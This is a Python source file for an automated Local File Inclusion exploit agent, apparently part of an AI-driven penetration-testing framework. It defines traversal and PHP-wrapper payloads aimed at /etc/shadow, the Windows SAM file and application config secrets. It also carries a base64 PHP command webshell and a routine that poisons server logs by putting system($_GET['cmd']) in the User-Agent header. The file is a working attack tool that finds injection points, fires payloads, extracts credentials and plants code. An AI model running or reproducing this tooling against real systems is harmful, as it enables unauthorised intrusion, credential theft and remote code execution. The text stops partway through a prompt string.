"""
Local File Inclusion (LFI) Exploit Agent
Professional LFI testing and exploitation agent
"""

import asyncio
import aiohttp
import re
import urllib.parse
import base64
from typing import Dict, List, Any, Optional
from loguru import logger

from agents.base import BaseAgent, AgentResult
from agents.prompt_engineering.cybersecurity_llm import CyberSecurityLLM


class LFIAgent(BaseAgent):
    """
    Professional Local File Inclusion (LFI) Testing Agent
    Performs comprehensive LFI detection and exploitation
    """
    
    def __init__(self):
        super().__init__(
            name="lfi_agent",
            agent_type="exploit"
        )
        self.description = "Professional LFI testing and exploitation"
        self.llm = CyberSecurityLLM()
        
        # LFI Payloads - Professional Testing Suite
        self.basic_lfi_payloads = [
            # Basic path traversal
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../etc/shadow",
            "../../../proc/version",
            "../../../etc/issue",
            
            # Double encoding
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            
            # Null byte injection (for older systems)
            "../../../etc/passwd%00",
            "../../../etc/passwd%00.jpg",
            
            # URL encoding
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            
            # Windows paths
            "..\\..\\..\\boot.ini",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "..\\..\\..\\windows\\repair\\sam"
        ]
        
        self.advanced_lfi_payloads = [
            # Deep traversal
            "../../../../../../../../etc/passwd",
            "../../../../../../../../proc/self/environ",
            "../../../../../../../../proc/self/cmdline",
            "../../../../../../../../proc/version",
            "../../../../../../../../proc/meminfo",
            
            # Log poisoning preparation
            "../../../../../../../../var/log/apache2/access.log",
            "../../../../../../../../var/log/apache/access.log",
            "../../../../../../../../var/log/httpd/access_log",
            "../../../../../../../../var/log/nginx/access.log",
            "../../../../../../../../var/log/auth.log",
            "../../../../../../../../var/log/mail.log",
            
            # PHP wrappers
            "php://filter/convert.base64-encode/resource=../../../etc/passwd",
            "php://filter/read=string.rot13/resource=../../../etc/passwd",
            "php://filter/convert.iconv.utf-8.utf-16/resource=../../../etc/passwd",
            "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+",
            
            # Zip wrapper
            "zip://shell.jpg%23shell.php",
            
            # Phar wrapper
            "phar://shell.jpg/shell.php",
            
            # Expect wrapper (if enabled)
            "expect://id",
            "expect://ls",
            
            # Input wrapper
            "php://input",
            
            # Filter bypass techniques
            "....//....//....//etc/passwd",
            "..///////..////etc/passwd",
            "....\\\\....\\\\....\\\\windows\\system32\\drivers\\etc\\hosts",
            
            # Unicode bypass
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd"
        ]
        
        # Common sensitive files to test
        self.sensitive_files = {
            "linux": [
                "/etc/passwd",
                "/etc/shadow",
                "/etc/group",
                "/etc/hosts",
                "/etc/hostname",
                "/etc/issue",
                "/etc/ssh/sshd_config",
                "/proc/version",
                "/proc/self/environ",
                "/proc/self/cmdline",
                "/proc/meminfo",
                "/proc/cpuinfo",
                "/root/.bash_history",
                "/home/www-data/.bash_history",
                "/var/log/apache2/access.log",
                "/var/log/nginx/access.log",
                "/var/www/html/config.php",
                "/var/www/html/wp-config.php"
            ],
            "windows": [
                "C:\\windows\\system32\\drivers\\etc\\hosts",
                "C:\\boot.ini",
                "C:\\windows\\system32\\config\\sam",
                "C:\\windows\\repair\\sam",
                "C:\\windows\\system32\\config\\system",
                "C:\\windows\\system32\\config\\software",
                "C:\\autoexec.bat",
                "C:\\config.sys",
                "C:\\windows\\win.ini",
                "C:\\windows\\system.ini",
                "C:\\inetpub\\wwwroot\\web.config",
                "C:\\windows\\debug\\netsetup.log"
            ],
            "application": [
                "config.php",
                "configuration.php",
                "wp-config.php",
                "settings.py",
                "config.inc.php",
                ".env",
                "database.yml",
                "app.config",
                "web.config",
                "config.json"
            ]
        }
        
        # File content patterns for detection
        self.file_signatures = {
            "/etc/passwd": [
                r"root:x:0:0:",
                r"daemon:x:1:1:",
                r"bin:x:2:2:",
                r"\w+:x:\d+:\d+:"
            ],
            "/etc/shadow": [
                r"root:\$\w+\$",
                r"\w+:\$\w+\$[^:]+:",
                r"\w+:!:"
            ],
            "/etc/hosts": [
                r"127\.0\.0\.1\s+localhost",
                r"::1\s+localhost",
                r"\d+\.\d+\.\d+\.\d+\s+\w+"
            ],
            "boot.ini": [
                r"\[boot loader\]",
                r"timeout=\d+",
                r"default=",
                r"multi\(\d+\)"
            ],
            "config.php": [
                r"\$\w+\s*=\s*['\"][^'\"]*['\"];",
                r"define\s*\(\s*['\"][^'\"]*['\"]",
                r"\<\?php",
                r"mysql_connect|mysqli_connect|PDO"
            ],
            "wp-config.php": [
                r"DB_NAME",
                r"DB_USER",
                r"DB_PASSWORD",
                r"DB_HOST",
                r"AUTH_KEY"
            ],
            "/proc/version": [
                r"Linux version \d+\.\d+",
                r"gcc version",
                r"#\d+ SMP"
            ],
            "access.log": [
                r"\d+\.\d+\.\d+\.\d+ - - \[",
                r"\"GET \/",
                r"\" \d{3} \d+",
                r"Mozilla\/\d+\.\d+"
            ]
        }
        
        # PHP wrapper payloads for advanced exploitation
        self.php_wrapper_payloads = {
            "base64_filter": "php://filter/convert.base64-encode/resource={file}",
            "rot13_filter": "php://filter/read=string.rot13/resource={file}",
            "iconv_filter": "php://filter/convert.iconv.utf-8.utf-16/resource={file}",
            "string_filter": "php://filter/string.toupper/resource={file}",
            "data_wrapper": "data://text/plain;base64,{encoded_payload}",
            "input_wrapper": "php://input"
        }
    
    async def execute(self, target: str, config: Optional[Dict[str, Any]] = None) -> AgentResult:
        """
        Execute comprehensive LFI testing
        
        Args:
            target: Target URL or domain to test
            config: Configuration options
        """
        try:
            config = config or {}
            await self.expert_update_progress("starting", {
                "message": f"ðŸ” Starting LFI assessment for {target}",
                "target": target,
                "progress": 5
            })
            
            results = {
                "agent": "lfi_agent",
                "target": target,
                "vulnerabilities": [],
                "file_disclosures": [],
                "php_wrapper_results": [],
                "log_poisoning_potential": [],
                "sensitive_files_found": []
            }
            
            # Step 1: Discover potential LFI injection points
            await self.expert_update_progress("discovering", {
                "message": "ðŸŽ¯ Discovering potential LFI injection points...",
                "progress": 10
            })
            injection_points = await self._discover_lfi_points(target, config)
            
            # Step 2: Test basic LFI payloads
            await self.expert_update_progress("basic_testing", {
                "message": "ðŸ” Testing basic LFI payloads...",
                "progress": 25
            })
            basic_results = await self._test_basic_lfi(injection_points, config)
            if basic_results:
                results["vulnerabilities"].extend(basic_results)
            
            # Step 3: Test advanced LFI techniques
            await self.expert_update_progress("advanced_testing", {
                "message": "ðŸ”§ Testing advanced LFI techniques...",
                "progress": 45
            })
            advanced_results = await self._test_advanced_lfi(injection_points, config)
            if advanced_results:
                results["vulnerabilities"].extend(advanced_results)
            
            # Step 4: Test PHP wrapper exploitation
            await self.expert_update_progress("php_testing", {
                "message": "ðŸ˜ Testing PHP wrapper exploitation...",
                "progress": 60
            })
            php_results = await self._test_php_wrappers(injection_points, config)
            if php_results:
                results["php_wrapper_results"] = php_results
                results["vulnerabilities"].extend(php_results)
            
            # Step 5: Attempt sensitive file disclosure
            await self.expert_update_progress("file_disclosure", {
                "message": "ðŸ“‚ Attempting sensitive file disclosure...",
                "progress": 75
            })
            if results["vulnerabilities"]:
                sensitive_results = await self._attempt_sensitive_file_disclosure(results["vulnerabilities"][:3], config)
                results["sensitive_files_found"] = sensitive_results
                results["file_disclosures"] = sensitive_results
            
            # Step 6: Test log poisoning potential
            await self.expert_update_progress("log_poisoning", {
                "message": "ðŸ”¥ Testing log poisoning potential...",
                "progress": 85
            })
            log_results = await self._test_log_poisoning_potential(injection_points, config)
            results["log_poisoning_potential"] = log_results
            
            # Step 7: AI-powered analysis
            await self.expert_update_progress("analyzing", {
                "message": "ðŸ¤– AI analysis and recommendations...",
                "progress": 95
            })
            ai_analysis = await self._get_ai_analysis(results)
            results["ai_analysis"] = ai_analysis
            
            await self.expert_update_progress("complete", {
                "message": f"âœ… LFI assessment complete - {len(results['vulnerabilities'])} vulnerabilities found",
                "progress": 100,
                "vulnerabilities_found": len(results['vulnerabilities'])
            })
            
            return AgentResult(
                success=True,
                data=results,
                message=f"LFI assessment complete. Found {len(results['vulnerabilities'])} vulnerabilities."
            )
            
        except Exception as e:
            logger.error(f"LFI agent error: {e}")
            return AgentResult(
                success=False,
                error=f"LFI assessment failed: {e}",
                data={"target": target}
            )
    
    async def _discover_lfi_points(self, target: str, config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Discover potential LFI injection points"""
        injection_points = []
        
        try:
            # Parse target URL
            if not target.startswith(('http://', 'https://')):
                target = f"http://{target}"
            
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                # Use ONLY discovered URLs from recon (no hardcoded endpoints)
                test_urls = []
                
                # Check discovered URLs from recon
                discovered_urls = config.get('discovered_urls', [])
                if discovered_urls:
                    # Add LFI parameters to discovered URLs
                    for url in discovered_urls:
                        if '?' not in url:
                            test_urls.extend([
                                f"{url}?file=../../../etc/passwd",
                                f"{url}?page=../../../etc/passwd",
                                f"{url}?path=../../../etc/passwd"
                            ])
                    test_urls = list(set(test_urls))  # Remove duplicates
                
                for url in test_urls:
                    try:
                        async with session.get(url) as response:
                            if response.status == 200:
                                content = await response.text()
                                
                                # Look for parameters that might load files
                                parsed_url = urllib.parse.urlparse(str(response.url))
                                if parsed_url.query:
                                    params = urllib.parse.parse_qs(parsed_url.query)
                                    for param in params:
                                        risk_level = self._assess_lfi_param_risk(param, params[param][0] if params[param] else "")
                                        injection_points.append({
                                            "url": str(response.url),
                                            "type": "parameter",
                                            "method": "GET",
                                            "parameter": param,
                                            "original_value": params[param][0] if params[param] else "",
                                            "risk_level": risk_level
                                        })
                                
                                # Look for forms that might include files
                                forms = await self._extract_lfi_prone_forms(content, str(response.url))
                                for form in forms:
                                    injection_points.append({
                                        "url": form["action"],
                                        "type": "form",
                                        "method": form["method"],
                                        "inputs": form["inputs"],
                                        "risk_level": self._assess_form_lfi_risk(form)
                                    })
                    
                    except Exception as e:
                        logger.debug(f"Error testing URL {url}: {e}")
                        continue
        
        except Exception as e:
            logger.error(f"Error discovering LFI points: {e}")
        
        return injection_points[:15]  # Limit results
    
    def _assess_lfi_param_risk(self, param_name: str, param_value: str) -> str:
        """Assess the LFI risk level of a URL parameter"""
        high_risk_params = [
            "file", "page", "doc", "document", "path", "include", "load",
            "read", "view", "show", "get", "content", "template", "module"
        ]
        
        medium_risk_params = [
            "id", "name", "data", "src", "url", "link", "ref", "resource"
        ]
        
        param_lower = param_name.lower()
        value_lower = param_value.lower()
        
        # Check parameter name
        for risk_param in high_risk_params:
            if risk_param in param_lower:
                return "high"
        
        for risk_param in medium_risk_params:
            if risk_param in param_lower:
                return "medium"
        
        # Check parameter value for file indicators
        file_indicators = [".php", ".html", ".txt", ".inc", "/", "\\"]
        for indicator in file_indicators:
            if indicator in value_lower:
                return "medium"
        
        return "low"
    
    async def _extract_lfi_prone_forms(self, content: str, base_url: str) -> List[Dict[str, Any]]:
        """Extract forms that might be prone to LFI"""
        forms = []
        
        try:
            # Find all forms
            form_pattern = r'<form[^>]*>(.*?)</form>'
            form_matches = re.finditer(form_pattern, content, re.IGNORECASE | re.DOTALL)
            
            for form_match in form_matches:
                form_html = form_match.group(0)
                
                # Extract action
                action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                action = action_match.group(1) if action_match else base_url
                action = urllib.parse.urljoin(base_url, action)
                
                # Extract method
                method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                method = method_match.group(1).upper() if method_match else "GET"
                
                # Extract inputs with file-related names
                inputs = []
                input_pattern = r'<input[^>]*>'
                for input_match in re.finditer(input_pattern, form_html, re.IGNORECASE):
                    input_html = input_match.group(0)
                    name_match = re.search(r'name=["\']([^"\']*)["\']', input_html)
                    type_match = re.search(r'type=["\']([^"\']*)["\']', input_html)
                    
                    if name_match:
                        input_name = name_match.group(1)
                        input_type = type_match.group(1) if type_match else "text"
                        
                        # Look for file-related input names
                        if any(keyword in input_name.lower() for keyword in ["file", "page", "doc", "path", "include"]):
                            inputs.append({
                                "name": input_name,
                                "type": input_type
                            })
                
                if inputs:
                    forms.append({
                        "action": action,
                        "method": method,
                        "inputs": inputs,
                        "html": form_html
                    })
        
        except Exception as e:
            logger.error(f"Error extracting LFI-prone forms: {e}")
        
        return forms
    
    def _assess_form_lfi_risk(self, form: Dict[str, Any]) -> str:
        """Assess the LFI risk level of a form"""
        high_risk_indicators = [
            "file", "upload", "include", "page", "template", "document", "path"
        ]
        
        form_text = form.get("html", "").lower()
        action_url = form.get("action", "").lower()
        
        for indicator in high_risk_indicators:
            if indicator in form_text or indicator in action_url:
                return "high"
        
        # Check input names
        for input_field in form.get("inputs", []):
            input_name = input_field.get("name", "").lower()
            if any(indicator in input_name for indicator in high_risk_indicators):
                return "high"
        
        return "medium"
    
    async def _test_basic_lfi(self, injection_points: List[Dict[str, Any]], config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test basic LFI payloads"""
        vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                for point in injection_points[:8]:  # Limit for performance
                    for payload in self.basic_lfi_payloads[:6]:  # Test subset of payloads
                        vulnerability = await self._test_single_lfi_payload(session, point, payload, "basic")
                        if vulnerability:
                            vulnerabilities.append(vulnerability)
                            break  # Found vulnerability, move to next point
        
        except Exception as e:
            logger.error(f"Basic LFI testing error: {e}")
        
        return vulnerabilities
    
    async def _test_advanced_lfi(self, injection_points: List[Dict[str, Any]], config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test advanced LFI techniques"""
        vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                for point in injection_points[:5]:  # Limit for performance
                    for payload in self.advanced_lfi_payloads[:8]:  # Test subset of payloads
                        vulnerability = await self._test_single_lfi_payload(session, point, payload, "advanced")
                        if vulnerability:
                            vulnerabilities.append(vulnerability)
                            break  # Found vulnerability, move to next point
        
        except Exception as e:
            logger.error(f"Advanced LFI testing error: {e}")
        
        return vulnerabilities
    
    async def _test_single_lfi_payload(self, session: aiohttp.ClientSession, injection_point: Dict[str, Any], payload: str, payload_type: str) -> Optional[Dict[str, Any]]:
        """Test a single LFI payload"""
        try:
            if injection_point["type"] == "parameter":
                # Test URL parameter injection
                parsed_url = urllib.parse.urlparse(injection_point["url"])
                params = urllib.parse.parse_qs(parsed_url.query)
                param_name = injection_point.get("parameter")
                
                if param_name in params:
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                    
                    async with session.get(test_url) as response:
                        content = await response.text()
                        
                        # Check for file inclusion success
                        file_detected = self._detect_file_inclusion(content, payload)
                        if file_detected:
                            return {
                                "type": "Local File Inclusion",  # ðŸŽ¯ FIXED: Standardized field name
                                "url": injection_point["url"],
                                "endpoint": injection_point["url"],  # ðŸŽ¯ FIXED: Add endpoint for consistency
                                "parameter": param_name,
                                "vulnerability_type": "local_file_inclusion",
                                "payload_type": payload_type,
                                "severity": "medium",
                                "cvss_score": 6.5,
                                "payload_used": payload,
                                "file_detected": file_detected,
                                "evidence": self._extract_file_evidence(content, file_detected)[:500]
                            }
            
            elif injection_point["type"] == "form":
                # Test form injection
                form_data = {}
                for input_field in injection_point.get("inputs", []):
                    form_data[input_field["name"]] = payload
                
                if form_data:
                    method = injection_point.get("method", "POST")
                    if method.upper() == "GET":
                        async with session.get(injection_point["url"], params=form_data) as response:
                            content = await response.text()
                    else:
                        async with session.post(injection_point["url"], data=form_data) as response:
                            content = await response.text()
                    
                    file_detected = self._detect_file_inclusion(content, payload)
                    if file_detected:
                        return {
                            "type": "Local File Inclusion",  # ðŸŽ¯ FIXED: Standardized field name
                            "url": injection_point["url"],
                            "endpoint": injection_point["url"],  # ðŸŽ¯ FIXED: Add endpoint for consistency
                            "form_fields": list(form_data.keys()),
                            "vulnerability_type": "local_file_inclusion",
                            "payload_type": payload_type,
                            "severity": "medium",
                                "cvss_score": 6.5,
                            "payload_used": payload,
                            "file_detected": file_detected,
                            "evidence": self._extract_file_evidence(content, file_detected)[:500]
                        }
        
        except Exception as e:
            logger.debug(f"Error testing LFI payload: {e}")
        
        return None
    
    def _detect_file_inclusion(self, content: str, payload: str) -> Optional[str]:
        """Detect if file inclusion was successful"""
        try:
            # First check if it's JSON response from vulnerable app
            import json
            try:
                json_data = json.loads(content)
                # Check for vulnerable app's specific response format
                if json_data.get('payloadDetected') is True:
                    return "lfi_detected"
                if json_data.get('vulnerability') == 'lfi':
                    return "lfi_detected"
                if json_data.get('success') is True and 'file' in json_data:
                    return json_data.get('file', 'unknown_file')
            except json.JSONDecodeError:
                pass
        except:
            pass
        
        # Check against known file signatures
        for file_path, signatures in self.file_signatures.items():
            for signature in signatures:
                if re.search(signature, content, re.IGNORECASE | re.MULTILINE):
                    # Verify it's related to our payload
                    if any(file_indicator in payload.lower() for file_indicator in [file_path.split('/')[-1], file_path]):
                        return file_path
                    # Also check for generic file inclusion indicators
                    elif file_path in ["/etc/passwd", "/etc/hosts", "boot.ini"]:
                        return file_path
        
        # Check for generic file content indicators
        generic_patterns = [
            (r"root:x:0:0:", "/etc/passwd"),
            (r"127\.0\.0\.1\s+localhost", "/etc/hosts"),
            (r"\[boot loader\]", "boot.ini"),
            (r"Linux version \d+\.\d+", "/proc/version"),
            (r"\<\?php", "PHP file"),
            (r"define\s*\(\s*['\"]", "configuration file")
        ]
        
        for pattern, file_type in generic_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                return file_type
        
        return None
    
    def _assess_lfi_severity(self, file_detected: str) -> str:
        """Assess the severity of LFI based on file accessed - Always MEDIUM per CVSS 6.5"""
        # LFI is rated as MEDIUM (CVSS 6.5) regardless of file accessed
        # because it's limited to local files and doesn't provide RCE
        return "medium"
    
    def _extract_file_evidence(self, content: str, file_detected: str) -> str:
        """Extract evidence of successful file inclusion"""
        if file_detected == "/etc/passwd":
            # Extract user entries
            passwd_pattern = r"(\w+:x:\d+:\d+:[^:]*:[^:]*:[^\n]*)"
            matches = re.findall(passwd_pattern, content)
            return f"User entries found: {'; '.join(matches[:3])}"
        
        elif file_detected == "/etc/hosts":
            # Extract host entries
            hosts_pattern = r"(\d+\.\d+\.\d+\.\d+\s+\w+[^\n]*)"
            matches = re.findall(hosts_pattern, content)
            return f"Host entries found: {'; '.join(matches[:3])}"
        
        elif "config" in file_detected.lower():
            # Extract configuration entries
            config_pattern = r"(\$\w+\s*=\s*['\"][^'\"]*['\"];?)"
            matches = re.findall(config_pattern, content)
            return f"Configuration entries found: {'; '.join(matches[:3])}"
        
        # Generic evidence extraction
        lines = content.split('\n')[:10]  # First 10 lines
        return f"File content preview: {'; '.join(line.strip() for line in lines if line.strip())}"
    
    async def _test_php_wrappers(self, injection_points: List[Dict[str, Any]], config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test PHP wrapper exploitation"""
        php_vulnerabilities = []
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                for point in injection_points[:3]:  # Limit for performance
                    # Test base64 filter wrapper
                    base64_payload = self.php_wrapper_payloads["base64_filter"].format(file="../../../etc/passwd")
                    base64_vuln = await self._test_php_wrapper_payload(session, point, base64_payload, "base64_filter")
                    if base64_vuln:
                        php_vulnerabilities.append(base64_vuln)
                    
                    # Test data wrapper
                    php_code = "<?php system('id'); ?>"
                    encoded_payload = base64.b64encode(php_code.encode()).decode()
                    data_payload = self.php_wrapper_payloads["data_wrapper"].format(encoded_payload=encoded_payload)
                    data_vuln = await self._test_php_wrapper_payload(session, point, data_payload, "data_wrapper")
                    if data_vuln:
                        php_vulnerabilities.append(data_vuln)
        
        except Exception as e:
            logger.error(f"PHP wrapper testing error: {e}")
        
        return php_vulnerabilities
    
    async def _test_php_wrapper_payload(self, session: aiohttp.ClientSession, injection_point: Dict[str, Any], payload: str, wrapper_type: str) -> Optional[Dict[str, Any]]:
        """Test a PHP wrapper payload"""
        try:
            if injection_point["type"] == "parameter":
                parsed_url = urllib.parse.urlparse(injection_point["url"])
                params = urllib.parse.parse_qs(parsed_url.query)
                param_name = injection_point.get("parameter")
                
                if param_name in params:
                    params[param_name] = [payload]
                    new_query = urllib.parse.urlencode(params, doseq=True)
                    test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                    
                    async with session.get(test_url) as response:
                        content = await response.text()
                        
                        # Check for PHP wrapper success
                        if self._check_php_wrapper_success(content, wrapper_type):
                            return {
                                "type": "Local File Inclusion",  # ðŸŽ¯ FIXED: Standardized field name
                                "url": injection_point["url"],
                                "endpoint": injection_point["url"],  # ðŸŽ¯ FIXED: Add endpoint for consistency
                                "parameter": param_name,
                                "vulnerability_type": "php_wrapper_lfi",
                                "wrapper_type": wrapper_type,
                                "severity": "high",
                                "payload_used": payload,
                                "evidence": self._extract_php_wrapper_evidence(content, wrapper_type)
                            }
        
        except Exception as e:
            logger.debug(f"Error testing PHP wrapper payload: {e}")
        
        return None
    
    def _check_php_wrapper_success(self, content: str, wrapper_type: str) -> bool:
        """Check if PHP wrapper exploitation was successful"""
        if wrapper_type == "base64_filter":
            # Look for base64 encoded content
            base64_pattern = r"[A-Za-z0-9+/]{20,}={0,2}"
            if re.search(base64_pattern, content):
                return True
        
        elif wrapper_type == "data_wrapper":
            # Look for command execution output
            if re.search(r"uid=\d+", content):
                return True
        
        elif wrapper_type == "rot13_filter":
            # Look for ROT13 encoded content
            if "ebbg" in content.lower():  # "root" in ROT13
                return True
        
        return False
    
    def _extract_php_wrapper_evidence(self, content: str, wrapper_type: str) -> str:
        """Extract evidence of successful PHP wrapper exploitation"""
        if wrapper_type == "base64_filter":
            # Try to decode base64 content
            base64_matches = re.findall(r"[A-Za-z0-9+/]{20,}={0,2}", content)
            if base64_matches:
                try:
                    decoded = base64.b64decode(base64_matches[0]).decode('utf-8', errors='ignore')
                    return f"Base64 decoded content: {decoded[:200]}"
                except:
                    return f"Base64 encoded content found: {base64_matches[0][:50]}..."
        
        elif wrapper_type == "data_wrapper":
            return f"Command execution successful: {content[:200]}"
        
        return f"PHP wrapper {wrapper_type} exploitation successful"
    
    async def _attempt_sensitive_file_disclosure(self, vulnerabilities: List[Dict[str, Any]], config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Attempt to disclose sensitive files using confirmed LFI"""
        sensitive_disclosures = []
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                for vuln in vulnerabilities[:2]:  # Limit attempts
                    # Determine target OS based on previous findings
                    target_os = "linux"  # Default assumption
                    if "boot.ini" in str(vuln) or "windows" in str(vuln).lower():
                        target_os = "windows"
                    
                    # Try to access sensitive files
                    sensitive_files = self.sensitive_files[target_os][:5]  # Limit files tested
                    
                    for file_path in sensitive_files:
                        try:
                            # Construct payload based on original vulnerability
                            base_payload = vuln.get("payload_used", "../../../etc/passwd")
                            if "etc/passwd" in base_payload:
                                new_payload = base_payload.replace("etc/passwd", file_path.lstrip("/"))
                            else:
                                # Use similar traversal depth
                                traversal_depth = base_payload.count("../")
                                new_payload = "../" * traversal_depth + file_path.lstrip("/")
                            
                            # Test the new payload
                            result = await self._test_sensitive_file_access(session, vuln, new_payload, file_path)
                            if result:
                                sensitive_disclosures.append(result)
                        
                        except Exception as e:
                            logger.debug(f"Error testing sensitive file {file_path}: {e}")
                            continue
        
        except Exception as e:
            logger.error(f"Sensitive file disclosure error: {e}")
        
        return sensitive_disclosures
    
    async def _test_sensitive_file_access(self, session: aiohttp.ClientSession, base_vulnerability: Dict[str, Any], payload: str, file_path: str) -> Optional[Dict[str, Any]]:
        """Test access to a specific sensitive file"""
        try:
            if base_vulnerability.get("parameter"):
                # Parameter-based LFI
                parsed_url = urllib.parse.urlparse(base_vulnerability["url"])
                params = urllib.parse.parse_qs(parsed_url.query)
                param_name = base_vulnerability["parameter"]
                params[param_name] = [payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                
                async with session.get(test_url) as response:
                    content = await response.text()
                    
                    # Check if the specific file was accessed
                    if self._verify_specific_file_access(content, file_path):
                        return {
                            "file_path": file_path,
                            "payload_used": payload,
                            "content_preview": content[:300],
                            "sensitivity_level": self._assess_file_sensitivity(file_path),
                            "evidence": self._extract_specific_file_evidence(content, file_path)
                        }
        
        except Exception as e:
            logger.debug(f"Error testing sensitive file access: {e}")
        
        return None
    
    def _verify_specific_file_access(self, content: str, file_path: str) -> bool:
        """Verify if a specific file was successfully accessed"""
        if file_path in self.file_signatures:
            signatures = self.file_signatures[file_path]
            for signature in signatures:
                if re.search(signature, content, re.IGNORECASE):
                    return True
        
        # Generic checks based on file extension or name
        file_name = file_path.split("/")[-1].lower()
        
        if file_name in ["passwd", "shadow", "group"]:
            return re.search(r"\w+:x:\d+:\d+:", content) is not None
        elif file_name.endswith(('.conf', '.config', '.cfg')):
            return len(content) > 50 and not re.search(r"not found|error|forbidden", content, re.IGNORECASE)
        elif file_name.endswith('.log'):
            return re.search(r"\[.*\]|\d{4}-\d{2}-\d{2}", content) is not None
        
        return len(content) > 20 and not re.search(r"not found|error|forbidden", content, re.IGNORECASE)
    
    def _assess_file_sensitivity(self, file_path: str) -> str:
        """Assess the sensitivity level of a file"""
        critical_files = [
            "/etc/shadow", "/etc/passwd", "wp-config.php", "config.php", 
            ".env", "database.yml", "boot.ini", "/windows/system32/config/sam"
        ]
        
        high_files = [
            "/etc/ssh/sshd_config", "/etc/hosts", "web.config", 
            "app.config", "/proc/version", "/etc/group"
        ]
        
        file_lower = file_path.lower()
        
        if any(critical in file_lower for critical in critical_files):
            return "critical"
        elif any(high in file_lower for high in high_files):
            return "high"
        else:
            return "medium"
    
    def _extract_specific_file_evidence(self, content: str, file_path: str) -> str:
        """Extract specific evidence from file content"""
        file_name = file_path.split("/")[-1].lower()
        
        if "config" in file_name:
            # Look for sensitive configuration
            config_patterns = [
                r"password\s*[:=]\s*['\"][^'\"]*['\"]",
                r"secret\s*[:=]\s*['\"][^'\"]*['\"]",
                r"key\s*[:=]\s*['\"][^'\"]*['\"]",
                r"token\s*[:=]\s*['\"][^'\"]*['\"]"
            ]
            
            for pattern in config_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                if matches:
                    return f"Sensitive configuration found: {matches[0]}"
        
        elif file_name == "passwd":
            # Extract user information
            users = re.findall(r"(\w+):x:\d+:\d+:[^:]*:/[^:]*:", content)
            return f"System users found: {', '.join(users[:5])}"
        
        # Generic evidence
        lines = [line.strip() for line in content.split('\n')[:5] if line.strip()]
        return f"File content: {'; '.join(lines)}"
    
    async def _test_log_poisoning_potential(self, injection_points: List[Dict[str, Any]], config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Test for log poisoning potential"""
        log_poisoning_results = []
        
        try:
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=30)) as session:
                # Common log files to test
                log_files = [
                    "../../../var/log/apache2/access.log",
                    "../../../var/log/nginx/access.log",
                    "../../../var/log/auth.log",
                    "../../../var/log/mail.log"
                ]
                
                for point in injection_points[:3]:  # Limit testing
                    for log_file in log_files:
                        try:
                            # Test if we can read the log file
                            log_access = await self._test_single_lfi_payload(session, point, log_file, "log_access")
                            if log_access:
                                # Test if we can inject into the log
                                poisoning_potential = await self._test_log_injection(session, point, log_file)
                                if poisoning_potential:
                                    log_poisoning_results.append({
                                        "log_file": log_file,
                                        "injection_point": point,
                                        "poisoning_method": poisoning_potential["method"],
                                        "severity": "high",
                                        "description": f"Log poisoning possible via {poisoning_potential['method']}"
                                    })
                        
                        except Exception as e:
                            logger.debug(f"Error testing log poisoning for {log_file}: {e}")
                            continue
        
        except Exception as e:
            logger.error(f"Log poisoning testing error: {e}")
        
        return log_poisoning_results
    
    async def _test_log_injection(self, session: aiohttp.ClientSession, injection_point: Dict[str, Any], log_file: str) -> Optional[Dict[str, Any]]:
        """Test if we can inject into log files"""
        try:
            # Test User-Agent poisoning (for access logs)
            if "access.log" in log_file:
                poison_ua = "<?php system($_GET['cmd']); ?>"
                headers = {"User-Agent": poison_ua}
                
                # Make a request with poisoned User-Agent
                async with session.get(injection_point["url"], headers=headers) as response:
                    pass
                
                # Try to read the log file to see if our payload was logged
                log_content_vuln = await self._test_single_lfi_payload(session, injection_point, log_file, "log_read")
                if log_content_vuln and poison_ua in log_content_vuln.get("evidence", ""):
                    return {"method": "user_agent_poisoning"}
            
            # Test auth.log poisoning (via SSH attempts)
            elif "auth.log" in log_file:
                # This would require SSH access, so we just check if the file is readable
                return {"method": "ssh_log_poisoning"}
        
        except Exception as e:
            logger.debug(f"Error testing log injection: {e}")
        
        return None
    
    async def _get_ai_analysis(self, results: Dict[str, Any]) -> Dict[str, Any]:
        """Get AI-powered LFI analysis and recommendations"""
        try:
            prompt = f"""
            You are a professional cybersecurity expert analyzing Local File Inclusion (LFI) test results.
            
            Target: {results['target']}
            Vulnerabilities Found: {len(results['vulnerabilities'])}
            Sensitive Files Disclosed: {len(results['sensitive_files_found'])}
            PHP Wrapper Results: {len(results['php_wrapper_results'])}
            Log Poisoning Potential: {len(results['log_poisoning_potential'])}
            
            Vulnerability Details:
            {results['vulnerabilities'][:2] if results['vulnerabilities'] else 'None found'}
            
